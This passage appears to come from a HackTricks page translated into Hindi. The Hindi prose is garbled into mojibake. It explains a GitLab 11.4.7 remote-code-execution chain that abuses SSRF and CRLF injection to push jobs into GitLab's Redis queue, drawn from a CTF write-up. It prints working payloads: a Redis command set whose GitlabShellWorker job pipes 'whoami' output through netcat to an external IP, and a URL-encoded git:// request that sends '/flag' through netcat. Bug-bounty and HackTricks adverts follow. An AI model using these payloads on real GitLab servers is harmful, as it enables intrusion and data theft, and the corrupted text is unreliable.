рдЗрд╕рд▓рд┐рдП, рдЗрди рджреБрд░реНрдмрд▓рддрд╛рдУрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **Redis рдЗрдВрд╕реНрдЯреЗрдВрд╕** рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рдЬреЛ **gitlab** рд╕реЗ **рдХрддрд╛рд░реЗрдВ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ** рдФрд░ рдЙрди рдХрддрд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд** рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ред Redis рдХрддрд╛рд░ рджреБрд░реБрдкрдпреЛрдЧ рдкреЗрд▓реЛрдб рд╣реИ:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
рдФрд░ **URL encode** рдЕрдиреБрд░реЛрдз **SSRF рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдФрд░ **CRLF** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `whoami` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдФрд░ `nc` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдЙрдЯрдкреБрдЯ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ (рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд▓рд┐рдП рдЧрдпрд╛ рдерд╛ рдЬреИрд╕реЗ_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _рдореЗрдВ рд▓рд┐рдЦрд╛ рд╣реИ) рдпрд╣ рдЙрддреНрдкреАрдбрд╝рди `git` рдпреЛрдЬрдирд╛ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рдерд╛ рдФрд░ `http` рдпреЛрдЬрдирд╛ рдХреЗ рд╕рд╛рде рдирд╣реАрдВред_

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдХреЗ рд▓рд┐рдП рдШрд░ рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рдХреЗрд╡рд▓ рддрдм рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдкреБрд░рд╕реНрдХрд╛рд░ рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдкреБрд░рд╕реНрдХрд╛рд░ рдЙрд╕ рдмрдЧ рдХреЗ рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдорд┐рд▓реЗрдЧрд╛ред

**рд╡реЗрдм3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЙрдирдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ рд╡реЗрдм3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**рд╡реЗрдм3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддреНрдпреЗрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓** рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред**

</details>
